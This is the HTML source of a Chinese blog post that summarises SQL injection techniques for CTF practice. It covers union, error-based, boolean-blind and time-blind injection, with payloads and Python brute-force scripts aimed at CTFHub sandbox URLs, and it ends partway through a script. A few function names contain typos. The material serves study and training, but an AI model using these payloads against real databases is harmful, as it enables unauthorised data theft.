@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="夏饭orz">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="夏饭orz">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="冒险者，欢迎光临🌹">
+    <meta name="description" content="基础知识点： 注释符：# ,  &#x2F;**&#x2F; , –+ 重要的表:   表名 作用    information_schema.schemata 存储了myspl中所有数据库名   information_schema.tables 存储了myspl中所有表名   information_schema.columns 存储了myspl中所有列名    常用函数:   函数名 作用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql小总结">
+<meta property="og:url" content="http://example.com/2025/06/22/sql/index.html">
+<meta property="og:site_name" content="夏饭の小饭堂">
+<meta property="og:description" content="基础知识点： 注释符：# ,  &#x2F;**&#x2F; , –+ 重要的表:   表名 作用    information_schema.schemata 存储了myspl中所有数据库名   information_schema.tables 存储了myspl中所有表名   information_schema.columns 存储了myspl中所有列名    常用函数:   函数名 作用">
+<meta property="og:locale">
+<meta property="article:published_time" content="2025-06-22T06:30:00.000Z">
+<meta property="article:modified_time" content="2025-06-22T15:17:48.445Z">
+<meta property="article:author" content="夏饭orz">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/taco-truck.png">
+    <title>sql小总结 · 夏饭の小饭堂</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">sql小总结</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/54_i12.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                sql小总结
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="web漏洞">web漏洞</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="注入">注入</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/06/22</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="基础知识点："><a href="#基础知识点：" class="headerlink" title="基础知识点："></a>基础知识点：</h1><ol>
+<li>注释符：# ,  &#x2F;**&#x2F; , –+</li>
+<li>重要的表:<table>
+<thead>
+<tr>
+<th align="center">表名</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">information_schema.schemata</td>
+<td align="center">存储了myspl中所有数据库名</td>
+</tr>
+<tr>
+<td align="center">information_schema.tables</td>
+<td align="center">存储了myspl中所有表名</td>
+</tr>
+<tr>
+<td align="center">information_schema.columns</td>
+<td align="center">存储了myspl中所有列名</td>
+</tr>
+</tbody></table>
+</li>
+<li>常用函数:<table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">version()</td>
+<td align="center">查询数据库的版本</td>
+</tr>
+<tr>
+<td align="center">user()</td>
+<td align="center">查询数据库的使用者</td>
+</tr>
+<tr>
+<td align="center">database()</td>
+<td align="center">数据库</td>
+</tr>
+<tr>
+<td align="center">system_user()</td>
+<td align="center">系统用户名</td>
+</tr>
+<tr>
+<td align="center">session_user()</td>
+<td align="center">连接数据库的用户名</td>
+</tr>
+<tr>
+<td align="center">current_user()</td>
+<td align="center">当前用户名</td>
+</tr>
+<tr>
+<td align="center">load_file()</td>
+<td align="center">读取本地文件</td>
+</tr>
+<tr>
+<td align="center">@@datadir</td>
+<td align="center">读取数据库路径</td>
+</tr>
+<tr>
+<td align="center">@@basedir</td>
+<td align="center">mysql安装路径</td>
+</tr>
+<tr>
+<td align="center">@@version_complie_os</td>
+<td align="center">查看操作系统</td>
+</tr>
+<tr>
+<td align="center">ascii(str)</td>
+<td align="center">返回给定字符的ascii值。如果str是空字符串，返回0如果str是NULL，返回NULL。如 ascii(“a”)&#x3D;97</td>
+</tr>
+<tr>
+<td align="center">length(str)</td>
+<td align="center">返回给定字符串的长度，如 length(“string”)&#x3D;6</td>
+</tr>
+<tr>
+<td align="center">substr(string,start,length)</td>
+<td align="center">对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)&#x3D;”in”</td>
+</tr>
+<tr>
+<td align="center">substr()、stbstring()、mid()</td>
+<td align="center">三个函数的用法、功能均一致</td>
+</tr>
+<tr>
+<td align="center">concat(username)</td>
+<td align="center">将查询到的username连在一起，默认用逗号分隔</td>
+</tr>
+<tr>
+<td align="center">concat(str1,’*’,str2)</td>
+<td align="center">将字符串str1和str2的数据查询到一起，中间用*连接</td>
+</tr>
+<tr>
+<td align="center">group_concat(username)</td>
+<td align="center">将username所有数据查询在一起，用逗号连接</td>
+</tr>
+<tr>
+<td align="center">limit 0,1</td>
+<td align="center">查询第一页</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<p>4.常用语句:<br>SELECT column1, column2, …(*指所有行)<br>FROM table_name<br>[WHERE condition]<br>(条件运算符,逻辑运算符,以及通配符(与like配合使用,%代替零个或多个字符,_代替一个字符))<br>[ORDER BY column_name [ASC | DESC]]<br>[LIMIT number];</p>
+<h1 id="判断sql注入"><a href="#判断sql注入" class="headerlink" title="判断sql注入"></a>判断sql注入</h1><ul>
+<li>产生于与数据库发生交互的地方(登陆页面,涉及获取http头的功能点以及订单处理……)</li>
+<li>单引号,双引号,单括号,双括号等测试报错</li>
+<li>and 1&#x3D;1 &#x2F;and 1&#x3D;2 ,看页面显示(不报错为字符型，报错为数字型)</li>
+<li>时间盲注测试</li>
+<li>1’ or 1&#x3D;1#</li>
+<li>有时可以直接尝试读取flag库和表</li>
+<li>判断数据库类型</li>
+<li>在常见手段没用的时候考虑过滤（尤其要测试对关键词的双写）</li>
+</ul>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><ol>
+<li><p>条件:</p>
+<ul>
+<li>两个表的列数相同，并且相应的列具有相似的数据类型</li>
+<li>查询结果回显</li>
+<li>存在注入漏洞</li>
+</ul>
+</li>
+<li><p>常用函数:</p>
+</li>
+</ol>
+<blockquote>
+<p>union select</p>
+<ol start="3">
+<li>基本操作流程:</li>
+</ol>
+</blockquote>
+<ul>
+<li><p>id&#x3D;1 order by 2  &#x2F;&#x2F;根据报错判断列数</p>
+</li>
+<li><p>id&#x3D; -1 union select group_concat(table_name),1,2,3 from information_schema.tables where table_schema &#x3D;&#x2F;like database()  &#x2F;&#x2F;爆表名</p>
+</li>
+<li><p>id &#x3D; -1  union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘xx’   &#x2F;&#x2F;爆列名</p>
+</li>
+<li><p>id &#x3D; -1  union select concat(co)  from table  &#x2F;&#x2F;结果</p>
+</li>
+</ul>
+<p>SQlite中的联合注入</p>
+<ul>
+<li><p>union select 1,2,3,sqlite_version(),(select sql from sqlite_master limit 0,1)— &#x2F;&#x2F;查看表</p>
+</li>
+<li><p>union select 1,2,3,sqlite_version(),(select group_concat(flag) from flag)– &#x2F;&#x2F;查数据</p>
+</li>
+</ul>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><ol>
+<li>条件:<ul>
+<li>报错正常回显</li>
+</ul>
+</li>
+<li>常用函数:<blockquote>
+<ol>
+<li>updatexml（XML_document，XPath_string，new_value）<ul>
+<li>作用:改变文档中符合条件的节点的值</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<pre><code>  - 第一个参数：(string)XML文档对象的名称; 第二个参数：(Xpath格式的字符串)代表路径;第三个参数：(string)替换查找到的符合条件的数据
+  -当XPath_string出错就会报错,并会显示第二参数的内容
+</code></pre>
+<ol start="2">
+<li>extractvalue（XML_document，xpath_string）<ul>
+<li>作用:返回目标XML中包含所查询值的字符串</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<ol start="3">
+<li><p>基本操作流程:</p>
+<ul>
+<li><p>id &#x3D; 1 and updatexml(1,0x7e,2)</p>
+</li>
+<li><p>id &#x3D; 1 and updatexml(1,concat(0x7e,substr((select flag from flag),1,31)),3)  &#x2F;&#x2F;报错内容不超过32个字符,用substr复制解决(从1复制到31)</p>
+</li>
+<li><p>id &#x3D; 1 and updatexml(1,concat(‘~’,concat(0x7e,(select password from users limit 0,1)),3)<br>&#x2F;&#x2F;用limit解决(从0行开始返回1行)</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><ol>
+<li><p>条件:</p>
+<ul>
+<li>根据返回的true&#x2F;flase判断输入信息正确与否</li>
+</ul>
+</li>
+<li><p>常用函数:</p>
+<blockquote>
+<p>ascii()<br>substr()<br>length()<br>exists()<br>concat()</p>
+</blockquote>
+</li>
+<li><p>基本操作流程:</p>
+<ul>
+<li>id&#x3D;1 and exists(select * from information_schema.tables<mysql>&#x2F;select<em>from msysobjects<access>&#x2F;select</em>from sysobjects<sqlserver>)  &#x2F;&#x2F;猜测数据库类型</li>
+<li>id&#x3D;1 and length(database()) &gt; 5 &#x2F;&#x2F;猜测数据库名</li>
+<li>id&#x3D;1 and ascii(substrate(database(),1,1) &#x3D;&#x3D; 1) &#x2F;&#x2F;逐字符猜测</li>
+</ul>
+</li>
+<li><p>脚本:</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge-25ea32adc843431f.sandbox.ctfhub.com:10800/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果变量</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### **1. 用二分法查找 flag 长度**</span></span><br><span class="line">low, high = <span class="number">1</span>, <span class="number">200</span>  <span class="comment"># 长度范围</span></span><br><span class="line"><span class="keyword">while</span> low &lt; high:</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    payload = <span class="string">f&#x27;1 and length((Select flag from flag)) &lt;= <span class="subst">&#123;mid&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    res = requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;query_success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        high = mid  <span class="comment"># 长度 &lt;= mid，继续向左搜索</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        low = mid + <span class="number">1</span>  <span class="comment"># 长度 &gt; mid，向右搜索</span></span><br><span class="line"></span><br><span class="line">flag_length = low</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Flag length found: <span class="subst">&#123;flag_length&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### **2. 用二分法查找 flag 每个字符**</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_length + <span class="number">1</span>):</span><br><span class="line">    low, high = <span class="number">32</span>, <span class="number">126</span>  <span class="comment"># ASCII 可打印字符范围</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting character at position <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&#x27;1 and ord(mid((Select flag from flag), <span class="subst">&#123;i&#125;</span>, 1)) &lt;= <span class="subst">&#123;mid&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;query_success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            high = mid  <span class="comment"># 说明字符 &lt;= mid，缩小范围</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span>  <span class="comment"># 说明字符 &gt; mid，向右搜索</span></span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Found character: <span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Current Flag: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Final Flag: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ol>
+<li><p>条件:</p>
+<ul>
+<li>无回显</li>
+<li>加入sleep(5),返回速度慢5s</li>
+</ul>
+</li>
+<li><p>常用函数:</p>
+<blockquote>
+<p>sleep()<br>1 and if(1&#x3D;2, 1, sleep(2)) &#x2F;&#x2F;如果第一个参数为false,返回sleep(2),如果第一个参数为true,返回1</p>
+</blockquote>
+</li>
+<li><p>脚本</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-8cf69dd2f27977b3.sandbox.ctfhub.com:10800/&#x27;</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload = <span class="string">f&quot;1 and if((length((select flag from flag)))=<span class="subst">&#123;length&#125;</span>, sleep(2), 1)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 这里 timeout=1 用来判断是否 sleep(2) 生效</span></span><br><span class="line">        requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;, timeout=<span class="number">1</span>).text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="comment"># 发生超时，说明 sleep(2) 生效，长度正确</span></span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span>  <span class="comment"># 没有超时，继续增加长度</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+] Flag length found: <span class="subst">&#123;length&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">    low, high = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting character at position <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;1 and if((ord(mid((select flag from flag), <span class="subst">&#123;i&#125;</span>, 1))&lt;=<span class="subst">&#123;mid&#125;</span>), sleep(2), 1)&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;, timeout=<span class="number">1</span>).text</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error:&quot;</span>, e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    